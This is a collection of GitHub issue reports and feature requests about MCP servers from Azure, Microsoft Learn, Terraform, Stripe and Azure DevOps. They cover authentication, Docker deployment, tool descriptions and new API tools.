          ""type"": ""string""
        }
      }
    }
  }
}
```

Note that in this example, the locations array property includes an items field specifying that the array contains strings.

While OpenAI's documentation doesn't explicitly state ""any property of type array must include an items field,"" this is a requirement of the JSON Schema specification that OpenAI follows and enforces in their API validation.

The error message received (""array schema missing items"") confirms that OpenAI is enforcing this requirement from the JSON Schema specification.

When creating the Azure MCP server image, the container exits immediately without throwing any error messages. The build process completes successfully, and the image runs initially, but the container stops right after startup without any logs indicating the root cause. This makes it difficult to debug whether the issue is related to entrypoint configuration, missing dependencies, or misalignment in the startup command. Further investigation is needed to identify why the server process is not persisting after launch.

Kindly help me if anyone has faced the same issue."
Azure/azure-mcp,3360769801,1042,Issue with Subscription Tools in MCP Server Default Mode,closed,2025-08-27T20:30:36Z,2025-09-04T20:59:42Z,[],SantiagoLM01,"Hello,
I'm encountering an issue with the subscription tools when running the MCP server in default mode. Here's what I did:

Downloaded the repository.
Compiled the AzureMcp.Cli.csproj.
Added the resulting .exe to the mcp.json configuration.
Attached a debugger to the process.

When I attempted to generate a KQL query using the Kusto MCP via the full azmcp.exe, the operation failed due to a missing subscription ID. It seems that the subscription tool isn't being properly invoked in default mode.
Interestingly, when I ran the MCP server in all mode, which exposes each individual tool, everything worked as expected—I was able to see and use the subscription tool. This suggests that in default mode, the subscription tool might be hidden or not properly exposed due to command grouping.
Could this be a configuration issue or a limitation in how tools are surfaced in default mode?"

Public Management Environment (PME) applications hosted in PME tenants can be configured to allow access from users in other Microsoft Entra ID tenants (multi-tenant apps).

### 🔍 Context:
- The PME subscription requires authentication using my **PME account**, which is only accessible from a **SAW (Secured Admin Workstation) device** due to Conditional Access policies.
- When I attempt to authenticate from a non-SAW device in Github copilot chat, I receive a tenant mismatch or access blocked error as Goithub copilot has access token for Azure CORP subscription which works on FTE account.
- Re-authentication prompts do not allow switching to my PME account unless I'm on SAW.

### ❓ Request:
Is there a recommended or supported way to Connect the official Azure MCP server to a PME subscription **while authenticating from SAW**, but **developing from a non-SAW device**?

Any guidance or best practices for this hybrid setup would be greatly appreciated.

## Current Description
```
Your job is to answer questions about an Azure environment by executing Azure CLI commands. You have the following rules: - Use the Azure CLI to manage Azure resources and services. Do not use any other tool. - Provide a valid Azure CLI command. For example: 'group list'. - When deleting or modifying resources, ALWAYS request user confirmation. - If a command fails, retry 3 times before giving up with an improved version of the code based on the returned feedback. - When listing resources, ensure pagination is handled correctly so that all resources are returned. - You can ONLY write code that interacts with Azure. It CANNOT generate charts, tables, graphs, etc. - You can delete or modify resources in your Azure environment. Always be cautious and include appropriate warnings when providing commands to users. - Be concise, professional and to the point. Do not give generic advice, always reply with detailed & contextual data sourced from the current Azure environment.

The AKS tool (`mcp_azure-mcp-ser_aks`) needs improvements to its description and should include MCP tool annotations to enhance user experience and tool discoverability.

## Current Issues
- [ ] Description could be more action-oriented and specific about use cases
- [ ] Missing MCP tool annotations (readOnlyHint, destructiveHint, openWorldHint, title)
- [ ] Lacks clarity on when to use this tool

## Current Description
```
""Azure Kubernetes Service operations - Commands for managing Azure Kubernetes Service (AKS) cluster resources. Includes operations for listing clusters, retrieving cluster configurations, and managing Kubernetes environments in Azure.""
```

## Recommended Improvements

### Enhanced Description
```
""Manage Azure Kubernetes Service (AKS) clusters and resources. List clusters, retrieve configurations, manage node pools, and configure networking. Use this tool when working with Kubernetes deployments on Azure.""
```

### Required Annotations
Based on [MCP tool annotation best practices](https://blog.marcnuri.com/mcp-tool-annotations-introduction):

```typescript
annotations: {
  title: ""Azure Kubernetes Service (AKS)"",
  readOnlyHint: false,  // Can perform modifications
  destructiveHint: true, // Can delete/modify clusters
  openWorldHint: true   // Interacts with Azure
}
```

## Benefits
- **Enhanced User Experience**: Clear, user-friendly title and description
- **Improved Safety**: Destructive hint warns users about potentially dangerous operations
- **Better Tool Discovery**: Users can easily understand when to use this tool
- **Consistency**: Follows MCP annotation standards

My goal is to use the MCP server as a backend for my Streamlit (Python) app.

Steps to Reproduce:

Build the Docker image using the provided Dockerfile.
Attempt to run the MCP server container.
Try to connect to the MCP server from my Streamlit app.
Problems Encountered:

The Docker build sometimes fails or the container does not start as expected.
The MCP server only exposes stdio transport, so I am not sure how to connect my Streamlit app (which expects an HTTP API or similar).
There is no clear documentation on integrating MCP with Python/Streamlit.
Questions:

How can I reliably build and run the MCP server with Docker?
What is the recommended way to connect a Python/Streamlit app to the MCP server (given it only supports stdio transport)?
Is there a Python SDK or example for MCP integration?
Are there plans to support HTTP/SSE endpoints for easier integration with web apps?

3. **Azure MCP**: Reference this repository (@Azure/azure-mcp). Only the monitor endpoint is required, and please include only read-only tools.
4. **GitHub MCP server**.

### Considerations

1. **Pipeline Update**: Update the pipeline configuration so that any future updates to the MCP configuration file will:
   - Notify the platform team when a Pull Request is created affecting this file.
   - Require explicit approval from the platform team before merging.

2. **MCP On-Demand Enablement**:
   - Devise a way to enable MCP on demand, taking into account that VSCode only allows a maximum of 126 tools to be enabled at any time.

## Tasks
- Draft a new MCP configuration referencing the above servers and endpoints.
- Ensure Azure MCP is configured with only the monitor endpoint and read-only tools.
- Reference current codespace setting and Sentry documentation for respective implementations.
- Update the CI/CD pipeline to trigger notifications and require platform approval for MCP config changes.
- Propose a scalable solution for on-demand MCP tool enablement within VSCode limitations.

MicrosoftDocs/mcp,3344656291,61,Feature request: Emit raw HTTPS links (not vscode-file://) from MicrosoftDocs MCP Server in VS Code,closed,2025-08-22T08:35:48Z,2025-08-22T12:55:17Z,[],KazuOnuki,"Summary 

When using the MicrosoftDocs MCP Server tool in VS Code, links to Microsoft Learn render as normal `https://` URLs. However, when those links are copied and pasted into other applications (e.g., Outlook or OneNote), the underlying href is a `vscode-file://` URI pointing to a local VS Code resource, making the link unusable for others and potentially exposing local paths.

Problem

- Expected: The tool outputs standard web links like `https://learn.microsoft.com/...` that remain intact when copied to other apps.

- Actual: The copied link becomes something like: `vscode-file://vscode-app/c:/Users/<UserName>/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html` This is not accessible to others and ties the link to a local VS Code instance.

Why this matters (security and UX)

- Inaccessible links degrade sharing and collaboration.
- The `vscode-file://` link can reveal portions of a local path (user profile, app locations), which is an avoidable minor information disclosure.
- Even if the use of `vscode-file://` is implementation-driven inside VS Code, the externally shared link should remain a raw `https://` URL.

Proposed solution

- Ensure the MCP tool emits and preserves raw `https://` URLs in outputs and clipboard operations.
- If VS Code must wrap links for internal navigation, provide one of the following:
  - A setting to __“Copy as web link (https)”__ that strips any `vscode-file://` wrapper.
  - Default behavior that keeps the href as `https://` when the target is a web URL, reserving `vscode-file://` only for true local resources.
  - An explicit __“Copy link (https)”__ action in the result UI.

Repro steps

1. Use MicrosoftDocs MCP Server tool in VS Code to generate a Microsoft Learn link.
1. Copy the link and paste it into Outlook or OneNote.
1. Observe that the pasted hyperlink points to a `vscode-file://…` path instead of the `https://learn.microsoft.com` URL.

Environment

- VS Code on Windows
- MicrosoftDocs MCP Server tool

> To work with ChatGPT Connectors or deep research (in ChatGPT or via API), your MCP server must implement two tools - `search` and `fetch`.
> 
> ### search tool
> The search tool is used to return a list of potentially relevant search results from the data set exposed by your MCP server.
> 
> Arguments:
> 
> A single query string.
> 
> Returns:
> 
> An array of objects with the following properties:
> 
> `id` - a unique ID for the document or search result item
> `title` - a string title for the search result item
> `text` - a relevant snippet of text for the search terms
> `url` - a URL to the document or search result item. Useful for citing specific resources in research.
> 
> ### fetch tool
> The fetch tool is used to retrieve the full contents of a search result document or item.
> 
> Arguments:
> 
> A string which is a unique identifier for the search document.
> 
> Returns:
> 
> A single object with the following properties:
> 
> `id` - a unique ID for the document or search result item
> `title` - a string title for the search result item
> `text` - The full text of the document or item
> `url` - a URL to the document or search result item. Useful for citing specific resources in research.

MicrosoftDocs/mcp,3168461711,32,"Multiple Issues with MCP Learn Server: Response Format, Config Handling, Installation & Context Usage",open,2025-06-23T14:42:24Z,2025-06-26T05:20:20Z,[],ShivamGoyal03,"While working with the Microsoft Learn MCP server, I encountered several issues related to its response format, parameter configuration, installation methods, and contextual relevance in outputs. This issue outlines the problems and suggests improvements.

---

### 🐞 Bug Reports

#### 1. **Inconsistent Response Format**

**Expected:**

```python
result.content = [
    TextContent,
    TextContent,
    TextContent
]
```

**Actual:**

```python
result.content = [
    TextContent,
    Text = [
        TextContent,
        TextContent,
        TextContent
    ]
]
```

The nested `Text = [...]` structure seems unexpected and breaks consistency with how content is processed downstream in tools.

---

#### 2. **Configuration Parameter Limitation**

Currently, the server appears to accept only the `query` parameter. However, other tools and agents often use `question`, which is not recognized in the current implementation.

🧪 **Reproduction Example:**
See this sample I created that utilizes `question`:
🔗 [Scenario Sample (Python)](https://github.com/microsoft/mcp-for-beginners/blob/main/09-CaseStudy/docs-mcp/solution/python/scenario2.py)

---

### 💡 Feature Requests

#### 3. **Installation Support with uvx/npx or MCP-native CLI**

There's currently no guidance or working setup to:

* Install the MCP server via `uvx`, `npx`, or package manager.
* Deploy and run it as a standalone MCP-compatible tool instead of just through API calls or SSE streams.

A CLI-based or containerized deployment option would make integration far easier.

---

#### 4. **Improve Content Relevancy**

Referencing [Issue #7](https://github.com/MicrosoftDocs/mcp/issues/7), there’s a need to improve retrieval accuracy and context-aware ranking. A more **agentic RAG** (retrieval-augmented generation) approach would be beneficial here.

---

#### 5. **Agent-Aware Context Fetching**

As seen in [PR #23](https://github.com/MicrosoftDocs/mcp/pull/23), using the MCP tool currently requires the agent to be manually instructed to fetch documents. Ideally, agents should autonomously determine when and what to fetch based on conversation flow.

---

#### 6. **Expand Source Search to TechCommunity and DevBlogs**

**Request:**
Can you integrate additional content sources like:

* [Microsoft TechCommunity](https://techcommunity.microsoft.com)
* [Microsoft Developer Blogs](https://devblogs.microsoft.com/)

This would enable richer and more diversified documentation responses."

I notice that right now the search tool just accepts a ""query"" and no other filtering parameters. Given that the docs are associated with specific framework/package versions, would it be possible to:

 * Accept one or more package ID/version pairs with the request
 * Filter the results accordingly

I'm imagining the client knowing which packages you've referenced and automatically getting corresponding docs, because:

 * If you're using older packages, you do *not* want to retrieve docs for newer packages as it will then try to use APIs that don't exist for you, producing worse results instead of improving them
 * If you're using newer packages, you do *not* want to retrieve docs that correspond to older versions since the APIs might have changed or been obsoleted.

#### Use-cases
I would like the ability to describe a terraform workspace configuration to the MCP server and have it create it. I would like the ability to pass some standard values when we create workspaces.

#### Attempted Solutions

None of the existing tools discoverable appear to be able to write to TFC

#### Proposal

Creation of a tool to write terraform cloud workspaces. Allow for some normal configuration we use to create workspaces such as:

- VCS - git repo, branch, folders
- agent pool
- ability to attach to a project
- ability to create update and destroy workspace variables.
- set tags
- attach variable sets.

#### Use-cases
MCP Servers have been standardizing on the OAuth protocol for authentication. It would be great if the MCP server would follow suite and not require authentication via the TFE Token.

#### Attempted Solutions
when building from source, we can now reference terraform cloud but it requires a TFE token.

#### Proposal
Follow the standard OAuth2 to allow the MCP server to access Terraform Cloud without a static token. Ensure use of PDM so VS Code will automatically know how to perform OAuth authentication.

<!---
In order to properly evaluate a feature request, it is necessary to understand the use-cases for it.

Please describe below the _end goal_ you are trying to achieve that has led you to request this feature.

Please keep this section focused on the problem and not on the suggested solution. We'll get to that in a moment, below!
-->

Consider the scenario where the agent has been asked to implement a configuration. Currently the tool returns the registry documentation for a given resource. Whist valuable, this is sub-optimal when the agent needs to understand resource attributes, etc.

Often times the agent is sidetracked by the markdown returned by the tool. Instead I have had much better success by returning ONLY the JSON schema of the resource. This reduces token use and keeps the agent on-track.

I think the following tools should be available:

1. List resources in provider
2. List datasources in provider
3. List ephemerals in provider
4. List functions in provider

The above should return a list of the resource names, plus a short description (The MarkdownDescription in the schema).

Furthermore there should be tools that return the JSON schema of any given resource type:

1. Get resource schema
2. Get datasource schema
3. Get Ephemeral schema
4. Get function schema

The above would return only JSON for the request.

#### Attempted Solutions

I have authored an experimental go module to return the schema via a GRPC connection: <https://pkg.go.dev/github.com/matt-FFFFFF/tfpluginschema>.

Example MCP server here: <https://github.com/matt-ffffff/terraform-mcp-eva>

Another way is to embed terraform core into the MCP server and run the `terraform providers schema -json` command, in doing this we would need to create a `terraform.tf` file in a temporary directory and run `init`.

I think talking to the providers directly and extracting JSON will yield a better experience for the caller.

### Considerations

The above requires the agent to select a provider version. We may need another tool to parse the required_providers block and return an appropriate version, we could use the existing go module to do this. In my experimentation, the agent would often make up the version and end up downloading a very old version of the provider and getting the wrong schema."

I recommend that terraform-mcp-server requests set a distinct user agent header for each release, such as `terraform-mcp-server/{semver}`. This will help operators of upstream HTTP servers to identify traffic that originates from the MCP server.

Here is a similar practice in the official GitHub MCP server:

https://github.com/github/github-mcp-server/blob/8aa3379feacb388289379d27b27692e91dd3c2ed/internal/ghmcp/server.go#L60"

hashicorp/terraform-mcp-server,3214244548,110,Feature: validate Origin header,closed,2025-07-09T02:06:38Z,2025-07-11T22:58:52Z,[],wellsiau-aws,"Original request to upstream library mcp-go can be found [here](https://github.com/mark3labs/mcp-go/issues/475)

## Problem Statement

As per MCP security recommendation [here](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning), it's recommended to do origin header validation.

Currently I am implementing this on my test MCP server and I thought it would be nice if we could add similar capability natively in mcp-go.

## Proposed Solution

* Add new CORS Config, i.e. `strict`, `dev` and `disabled` 
* Add new allowed-origin config, i.e. http://mydomain.com and http://localhost
* Implement origin validation logic

## MCP Spec Reference

As per MCP security recommendation [here](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#security-warning), it's recommended to do origin header validation.

The common env var name such as `PORT` might conflict with similar env-vars used inside the MCP Inspector.

This will cause MCP Inspector failed to run when you test it via `STDIO` mode.

Ideas:
`TRANSPORT_MODE` and `TRANSPORT_PORT`

A possible implementation (open to other solutions) is to use `v1` endpoint for all things resources/data-sources and only utilize `v2` when the mention of `provider-reference` is used. This will prevent multiple GET calls for resources/data-sources.

stripe/agent-toolkit,3186171472,121,Add Support for Creating Recurring Prices in Stripe MCP,closed,2025-06-29T13:33:53Z,2025-08-22T03:21:01Z,[],afneyman,"# Issue: Add Support for Creating Recurring Prices in Stripe MCP

**Submitted by**: Claude Code (Anthropic's official CLI for Claude)

## Problem Description

When implementing a subscription-based payment system using the Stripe MCP (Model Context Protocol) server, I encountered a limitation where the `create_price` function only creates one-time prices and doesn't support the `recurring` parameter required for subscription pricing.

### Current Behavior

The `mcp__stripe__create_price` function creates prices with `type: ""one_time""` and `recurring: null`, making it impossible to create subscription prices through the MCP interface.

Example of current output:
```json
{
  ""id"": ""price_1RfLAiQ87p5hztc2w49oeP4x"",
  ""type"": ""one_time"",
  ""recurring"": null,
  // ... other fields
}
```

### Expected Behavior

The function should support creating recurring prices for subscriptions with parameters like:
- `recurring.interval` (e.g., ""month"", ""year"")
- `recurring.interval_count` (for quarterly billing, etc.)
- `lookup_key` for easier price retrieval

## Use Case

This limitation required me to work around the MCP by creating a separate Node.js script to create subscription prices. In a production example repository for Stripe integration with Expo/React Native, having proper subscription support in the MCP would be essential.

## Proposed Solution

Enhance the `create_price` function to accept optional `recurring` and `lookup_key` parameters:

```typescript
interface CreatePriceParams {
  product: string;
  unit_amount: number;
  currency: string;
  recurring?: {
    interval: 'day' | 'week' | 'month' | 'year';
    interval_count?: number;
  };
  lookup_key?: string;
  metadata?: Record<string, string>;
}
```

## Workaround Used

I had to create a separate script using the Stripe SDK directly:

```javascript
const price = await stripe.prices.create({
  product: productId,
  unit_amount: 999,
  currency: 'usd',
  recurring: {
    interval: 'month'
  },
  lookup_key: 'monthly',
  metadata: {
    tier: 'monthly',
    display_name: 'Monthly - $9.99/month'
  }
});
```

## Impact

This enhancement would make the Stripe MCP more complete for subscription-based businesses, which are a major use case for Stripe. It would allow AI agents to properly set up subscription pricing without requiring manual intervention or custom scripts.

## Additional Context

While implementing a multi-tier subscription system (monthly, quarterly, yearly), I also noticed that archiving/deactivating old products isn't available in the MCP, which would be another useful addition for maintaining a clean product catalog.

---

**Note**: This issue was identified and documented by Claude Code while implementing a Stripe integration example. The limitation impacts the ability to create production-ready subscription systems through the MCP interface alone."

Without the ability to redirect after payment, We can’t provide a seamless post-payment experience (e.g., confirming the booking, showing session details, or initiating calendar creation). This limits the ability to build modern, smooth UX flows with Stripe Payment Links inside the agent tool framework.

### Describe the solution you'd like

I would like the `create_payment_link` function in the Stripe agent tool to support an optional `redirect_url` parameter. This would allow developers to control what page users are redirected to after completing a payment.

This could be passed as an optional argument in the tool input like:

`{
  ""price"": ""10"",
  ""quantity"": 1,
  ""redirect_url"": ""https://example.com/redirect""
}`

### Describe alternatives you've considered

I currently have no alternative solution that meets the need as cleanly. 

### Additional context

external hosted payment pages (Stripe Payment Links). Adding redirect_url support would greatly improve UX and align Payment Links with modern use cases."

While the Stripe Agent Toolkit enables the creation of payment links, there is no integrated functionality to verify payment statuses directly within the toolkit. This creates a gap for developers who need real-time payment verification for seamless and automated agent workflows, resulting in additional complexity and manual effort.

### Describe the solution you'd like

I propose the addition of payment verification tools to the library. This feature could include:

- A new action in the StripeAgentToolkit configuration for payment_links.verify.
- Methods to query and confirm payment statuses (e.g., succeeded, pending, failed) using payment link IDs.
- Detailed response data, such as payment amount, payer details, and timestamp, to integrate with various agent workflows efficiently.

These tools would enhance the library's utility by enabling end-to-end payment management within agent-based frameworks like LangChain and CrewAI.

### Describe alternatives you've considered

- Webhook Integration: Using Stripe webhooks to receive payment updates, but this requires additional infrastructure and might not be practical for all developers.
- Manual API Queries: Polling the Stripe API for payment status, which adds extra coding effort and complexity.

Native payment verification tools would simplify these workflows and provide a more integrated solution for developers using the toolkit.

### Additional context

This feature would complement the existing support for payment link creation, making the library more robust for agent-based payment workflows. It would be particularly useful for projects requiring real-time payment validation in automated systems using LangChain, CrewAI, or Vercel's AI SDK."

Currently, contributors and users rely solely on issues to ask questions or discuss topics related to the repository. This often leads to clutter in the issue tracker, making it harder to manage and distinguish between actual bugs and feature requests versus general discussions or questions.

### Describe the solution you'd like

I propose enabling GitHub Discussions for this repository. GitHub Discussions can serve as a dedicated space for community interactions, such as:

- Sharing ideas and brainstorming new features.
- Asking and answering general questions.
- Showcasing projects that use the library.
- Encouraging collaborative problem-solving among users.

This will improve collaboration, enhance knowledge sharing, and foster a stronger community around the repository. It will also help maintain a cleaner and more focused issue tracker.

### Describe alternatives you've considered

Some alternatives include:

- Using external forums or chat tools (e.g., Discord or Slack). However, these require additional setup and maintenance.
- Continuing to use issues for discussions. However, this isn't an ideal solution, as it makes the issue tracker harder to manage over time.

GitHub Discussions is an integrated feature and a better fit for this purpose since it centralizes all community interactions within the repository.

By enabling GitHub Discussions, we can also categorize different types of conversations (e.g., Q&A, ideas, announcements), making it easier for contributors and users to find relevant information. It is a lightweight and efficient way to build a more engaged and supportive community."

### Discussed in https://github.com/microsoft/azure-devops-mcp/discussions/619

<div type='discussions-op-text'>

<sup>Originally posted by **BartoszKawa** October 21, 2025</sup>
Hi,

According to the official GitHub Copilot tutorial on [configuring MCP server access](https://docs.github.com/en/copilot/how-tos/administer-copilot/configure-mcp-server-access?utm_source=chatgpt.com), each MCP server needs to expose a manifest JSON (via a manifest_url) that describes the server’s capabilities, tools, and schema.

We’re currently trying to register Azure DevOps MCP in a Copilot MCP registry and configure access for our organization. However, this package (@azure-devops/mcp) doesn’t appear to include or publish a manifest file — neither in the GitHub repository nor in the npm package metadata.

#Why this matters:
The GitHub Copilot MCP registry requires a valid manifest_url for every MCP server entry. Without an accessible manifest, Copilot cannot validate or register this MCP for managed access.

#Questions:
1. Is there an official manifest file (static or generated) available for @azure-devops/mcp?
2. If not yet published, do you plan to provide one for registry integration?
3. Or should we generate and host a manifest ourselves (based on available documentation and tools)?

Thanks in advance for clarifying!</div>"

microsoft/azure-devops-mcp,3509525489,582,Add Personal Access Token (PAT) authentication support,closed,2025-10-13T10:53:16Z,2025-10-13T12:33:38Z,[],fsabatini82,"## 🎯 Feature Request: Personal Access Token Authentication

### **Problem Statement**
Currently, the Azure DevOps MCP server only supports interactive OAuth, Azure CLI, and environment credential authentication methods. This creates limitations for:
- CI/CD pipelines and automation scripts
- Headless environments (containers, GitHub Actions, etc.)
- Organizations with strict OAuth policies
- Scenarios where interactive browser authentication is not feasible

### **Proposed Solution**
Add Personal Access Token (PAT) authentication as a new authentication mode to enable non-interactive usage of the Azure DevOps MCP server.

### **Feature Requirements**

#### **Core Functionality**
- [ ] New CLI option: `--authentication pat` or `-a pat`
- [ ] Environment variable support with precedence:
  1. `AZDO_PAT` (primary)
  2. `ADO_PAT` (fallback)
  3. `AZURE_DEVOPS_EXT_PAT` (Azure DevOps extension compatibility)
- [ ] Automatic token validation and whitespace trimming
- [ ] Seamless integration with existing Azure DevOps Node API

#### **Technical Implementation**
- [ ] Centralized authorization header construction
- [ ] Support for both PAT and Bearer token formats
- [ ] Integration across all tool domains (core, wiki, work-items, pipelines, repositories, etc.)
- [ ] Backward compatibility with all existing authentication methods
- [ ] Proper error handling and user guidance

#### **Testing & Quality**
- [ ] Comprehensive unit tests for PAT authentication logic
- [ ] Integration tests for authorization header construction
- [ ] Edge case testing (empty tokens, whitespace handling, etc.)
- [ ] Maintain existing test coverage levels (99%+)

#### **Documentation**
- [ ] Update README with authentication options table
- [ ] Add PAT setup instructions to Getting Started guide
- [ ] Include security best practices and scope recommendations
- [ ] Add usage examples and troubleshooting guide

### **Usage Example**
```bash
# Set PAT environment variable
export AZDO_PAT=""your-personal-access-token""

# Run with PAT authentication
mcp-server-azuredevops myorg --authentication pat

# Or use in mcp.json configuration
{
  ""servers"": {
    ""ado"": {
      ""type"": ""stdio"",
      ""command"": ""mcp-server-azuredevops"",
      ""args"": [""myorg"", ""--authentication"", ""pat""]
    }
  }
}

This works well locally but I'd like to give this MCP Server's tools to my web app users. I can do this via a subprocess and have it working *locally* however interactive device-code doesnt work when deployed since it can't open a tab for the user to authenticate.

I can get Entra access tokens for my users using the Azure DevOps user_impersonation permission. I need a way to pass this to the session of this MCP server (user-scoped). Ideally this would be accomplished via `{""Authorization"": ""Bearer TOKEN""}` headers passed to the MCP server session. Presumably this would be a prerequisite for the remote server anyways and it would be nice to prioritize the OAuth authentication part and give devopers the opportunity to give this MCP server to more users while we wait for the full remote server, which is obviously in high demand.

Thank you for considering this and thank you for making this MCP server it works great and is extremely valuable!"

Client: Claude Code
MCP Server: Azure DevOps MCP Server
Authentication Method: Personal Access Token (PAT)

Issue Description
The Azure DevOps MCP server starts successfully, but authentication fails when using a Personal Access Token (PAT). The error suggests that the PAT token might not be properly supported or recognized by the server when connecting through Claude Code.
Steps to Reproduce

Configure the Azure DevOps MCP server with a valid PAT token
Start the server (starts successfully)
Attempt to connect using Claude Code
Authentication fails despite valid PAT token

Expected Behavior
The server should authenticate successfully using the provided PAT token and allow Claude Code to interact with Azure DevOps resources.
Actual Behavior
Authentication fails, appearing as if the PAT token is not being properly handled or supported.
Additional Context

The server itself starts without errors
PAT token has been verified to be valid
Issue appears to be specific to the authentication mechanism
Using Claude Code as the MCP client

Questions

Are there specific scopes required for the PAT token?
Is there a specific format or configuration needed for PAT tokens in Claude Code?
Are there any known compatibility issues between the Azure DevOps MCP server and Claude Code?

microsoft/azure-devops-mcp,3304293736,414,Add tool for getting all child items (option for recursively) for an item,closed,2025-08-08T14:38:34Z,2025-08-08T15:03:14Z,[],petrroll,"# Summary

Implement two new tools that integrate with Azure DevOps APIs to enable getting all workitems (optionally recursively) that are child of a specified workitem.

This is needed e.g. to get all child items of an epic, or all tasks for lower level workitems. 

# Tools

Develop the following tools with full parameter support, including optional ones:
wit_get_child_work_items

## Other info: 
This is what copilot sugested w.r.t. to implementation: 
Immediate children: Get the work item with relations and filter for System.LinkTypes.Hierarchy-Forward.
All descendants: Run a WIQL work item link query in Recursive mode, then fetch the returned target IDs.
How to do it

Immediate children of a work item
Request: GET [https://dev.azure.com/{organization}/{project}/_apis/wit/workitems/{id}?$expand=relations&api-version=7.1-preview.3](https://dev.azure.com/%7Borganization%7D/%7Bproject%7D/_apis/wit/workitems/%7Bid%7D?$expand=relations&api-version=7.1-preview.3)
In the response, look at item.relations and keep only those where: rel == ""System.LinkTypes.Hierarchy-Forward""
Each such relation has a url whose last segment is the child ID.
Example curl: curl -sS -H ""Authorization: Basic {BASE64(:PAT)}""
""[https://dev.azure.com/{org}/{project}/_apis/wit/workitems/{parentId}?$expand=relations&api-version=7.1-preview.3](https://dev.azure.com/%7Borg%7D/%7Bproject%7D/_apis/wit/workitems/%7BparentId%7D?$expand=relations&api-version=7.1-preview.3)""

All descendants (children, grandchildren, …)
Step A: Run a WIQL WorkItemLinks query in Recursive mode starting from the parent ID.
POST [https://dev.azure.com/{organization}/{project}/_apis/wit/wiql?api-version=7.1-preview.2](https://dev.azure.com/%7Borganization%7D/%7Bproject%7D/_apis/wit/wiql?api-version=7.1-preview.2) Body: { ""query"": ""SELECT [System.Id] FROM WorkItemLinks WHERE ([Source].[System.Id] = {PARENT_ID}) AND ([System.Links.LinkType] = 'System.LinkTypes.Hierarchy-Forward') MODE (Recursive)"" }

Notes:

MODE(Recursive) walks the full hierarchy under the source.

Optionally constrain to the same project: AND [Target].[System.TeamProject] = @project

If you only want targets that match your WHERE clause (omit the source), use: MODE (Recursive, ReturnMatchingChildren)

Step B: Collect the target IDs from the response’s workItemRelations (skip the first item with null rel).

Step C: Fetch details for those IDs in one call.

Option 1 (batch): POST [https://dev.azure.com/{organization}/{project}/_apis/wit/workitemsbatch?api-version=7.1-preview.3](https://dev.azure.com/%7Borganization%7D/%7Bproject%7D/_apis/wit/workitemsbatch?api-version=7.1-preview.3) Body: { ""ids"": [1,2,3], ""fields"": [ ""System.Id"", ""System.WorkItemType"", ""System.Title"", ""System.State"", ""System.AssignedTo"" ], ""$expand"": ""Relations"" }

Option 2 (query string): GET [https://dev.azure.com/{organization}/{project}/_apis/wit/workitems?ids=1,2,3&$expand=relations&api-version=7.1-preview.3](https://dev.azure.com/%7Borganization%7D/%7Bproject%7D/_apis/wit/workitems?ids=1,2,3&$expand=relations&api-version=7.1-preview.3)

Practical tips

Children vs parent link types:
Child from parent: System.LinkTypes.Hierarchy-Forward
Parent from child: System.LinkTypes.Hierarchy-Reverse
Large hierarchies: If you have many descendants, prefer workitemsbatch and paginate your own ID lists if necessary.
Authentication: Use a PAT with Work Items (read) scope and send as Basic auth with username empty and PAT as password.

2. Ensure each tool exposes all API parameters (required and optional).

In the readme for this repo, in the installation section, it says:
> 💥 We strongly recommend creating a .github\copilot-instructions.md in your project and copying the contents from this [copilot-instructions.md](https://github.com/microsoft/azure-devops-mcp/blob/main/.github/copilot-instructions.md) file. This will enhance your experience using the Azure DevOps MCP Server with GitHub Copilot Chat.

But that copilot-instructions file is clearly intended for development _of_ this MCP tool, right? It contains references to files in this repo. It doesn't look like it is intended for use in others' repos. Should there be a separate recommended copilot-instructions file which is recommended & intended for users of the MCP tool?

I assume the copilot instructions file would just be a single line of something like

```
This project uses Azure DevOps. When the user asks to edit work items, pull requests, etc., always see if there is a relevant ADO tool available.
```

I'm happy to make this change, but I just wanted to make sure my understanding is correct - is the current copilot-instructions.md file intended for users of the MCP server, or developers who are developing this MCP server itself?"
microsoft/azure-devops-mcp,3280575159,375,Add OAuth 2.0 support for remote server deployments,closed,2025-07-31T13:57:01Z,2025-08-25T07:15:19Z,[],NIOsGotGrit,"  Problem

  The current Azure DevOps MCP server only supports Azure CLI
  authentication (az login), which limits its usage to local development
   environments where users can run CLI commands. This prevents
  deployment on remote servers and usage in environments where Azure CLI
   isn't available or practical.

  Use Case

  Not all Azure DevOps users work exclusively in IDEs or have access to
  Azure CLI:
  - Project managers: Handle backlog management, sprint planning, and
  work item tracking without using development IDEs
  - Product owners: Need to query work items, track progress, and manage
   requirements
  - Stakeholders: Want to access project data and reports through AI
  assistants like Claude
  - Remote server deployments: Web applications, containers, cloud
  services
  - Multi-user environments: Where individual user authentication is
  required
  - Headless systems: Servers without interactive login capabilities

  Current Limitation

  Azure CLI authentication requires:
  1. Local Azure CLI installation
  2. Interactive login process (az login)
  3. Single-user credential sharing in server environments
  4. Direct server access for authentication

  Many users (project managers, product owners, stakeholders) who could
  benefit from Azure DevOps MCP integration through AI assistants don't
  have development environments set up with Azure CLI.

  Proposed Solution

  Add OAuth 2.0 support as an alternative authentication method:

  Environment Variables:
  AZURE_DEVOPS_AUTH_METHOD=oauth2  # or 'cli' for current behavior
  AZURE_DEVOPS_CLIENT_ID=your-client-id
  AZURE_DEVOPS_CLIENT_SECRET=your-client-secret
  AZURE_DEVOPS_REDIRECT_URI=your-callback-url

  Benefits:
  - Broader user access: Project managers and non-developers can use AI
  assistants with Azure DevOps
  - Server deployment: Works in containerized and cloud environments
  - Individual authentication: Each user authenticates with their own
  credentials
  - No CLI dependency: Removes requirement for Azure CLI installation
  - Standard OAuth flow: Uses well-established authentication patterns

  Implementation

  - Maintain backward compatibility with existing Azure CLI method
  - Add OAuth 2.0 flow using Azure DevOps OAuth endpoints
  - Use environment variables or configuration to select auth method
  - Follow standard OAuth 2.0 authorization code flow

  This would enable project managers and other non-technical users to
  leverage Azure DevOps data through AI assistants, expanding the MCP
  server's usability beyond developers to the entire project team."

Managing iterations in DevOps is painful. The Copilot could help here a lot. It should allow for listing all iterations in the project (now impossible). If I need to add new iterations for next quarter, I should be able to list and create missing iterations based on the existing pattern. Now it cannot create nested iterations. Then the copilot should be able to add new iterations to existing teams, and this works fine now.

I have tried replacing the configuration argument with my organization name, but I don't know how to update the manifest argument and still see the issue. This seems to have occurred both when setting up the MCP server with the instructions from the README, and when setting it up with the one click installation on the VSCode website (https://code.visualstudio.com/mcp).

### Requested Feature  
Add support for HTTP/SSE transport mode to enable integration with web-based MCP clients like open-webui.  
  
### Technical Requirements  
